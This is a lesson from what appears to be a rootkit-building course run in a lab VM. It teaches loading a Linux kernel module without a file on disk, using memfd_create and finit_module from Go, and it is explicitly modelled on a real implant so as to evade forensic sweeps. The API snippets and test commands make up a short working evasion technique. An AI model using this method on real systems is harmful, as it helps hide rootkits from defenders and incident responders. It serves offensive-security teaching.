# L20: Fileless Module Loading

L19 transferred files over TLS.
But the .ko landed on disk, where any forensic sweep finds it.
Real implants (PUMAKIT) never write the module to a file.
They hold it in memory and ask the kernel to load it from there.

## memfd + finit_module

Linux provides two primitives that, combined, let you load a kernel module
without any file on disk:

```text
  .ko bytes (embedded in Go binary via go:embed)
       |
       v
  memfd_create("", MFD_CLOEXEC)
       |  returns fd pointing to anonymous memory
       v
  write .ko bytes to fd
       |
       v
  finit_module(fd, "", 0)
       |  kernel reads the .ko from the fd
       |  loads it exactly like insmod would
       v
  close(fd)
       |  MFD_CLOEXEC already marked it close-on-exec
       |  but explicit close is clean
       v
  module is loaded, no file anywhere
```

`memfd_create` creates an anonymous file backed by RAM.
It appears under `/proc/self/fd/` while open but has no directory entry anywhere.
The `MFD_CLOEXEC` flag ensures the fd is closed automatically if the process
execs another binary.

`finit_module` is the fd-based variant of `init_module`.
Where `init_module` takes a pointer to the module bytes in userspace memory,
`finit_module` takes a file descriptor.
The kernel reads the ELF from the fd, verifies it, and loads it.
Same result as `insmod`, but the source can be a memfd with no filesystem path.

## You write

`main.go` (~10 lines of logic):

- Read embedded .ko bytes (go:embed already set up in starter)
- Create a memfd with `unix.MemfdCreate` and `MFD_CLOEXEC`
- Write the .ko bytes to the memfd
- Call `unix.FinitModule` to load the module from the fd
- Close the fd

## API

```go
import "golang.org/x/sys/unix"

// Create anonymous memory-backed fd.
// Name is for debugging only (visible in /proc/pid/fd/).
// MFD_CLOEXEC marks the fd close-on-exec.
fd, err := unix.MemfdCreate("", unix.MFD_CLOEXEC)

// Write bytes to the fd. Standard unix.Write.
n, err := unix.Write(fd, koBytes)

// Load module from fd. params="" for no parameters, flags=0.
err = unix.FinitModule(fd, "", 0)

// Close the fd.
unix.Close(fd)
```

```go
import _ "embed"

//go:embed rklings.ko
var koBytes []byte
```

## Test it

```
$ rklings build l20
$ rklings run l20
student@vm:~$ ./loader
student@vm:~$ lsmod | grep rklings
rklings                16384  0
student@vm:~$ find / -name 'rklings.ko' 2>/dev/null
student@vm:~$
```

The module shows in `lsmod` but no .ko file exists on disk.
A forensic analyst running `find` across the filesystem finds nothing.

## Validate

```
$ rklings validate l20
  [+] rklings module is loaded
  [+] no rklings.ko file on disk
  [+] module loaded via memfd (no file path)
  PASS
```

## Next

The module is fileless.
But the loader binary itself is still a file on disk.
L21 makes the agent binary fileless too, using the same memfd trick with a
twist: the fd must survive exec.
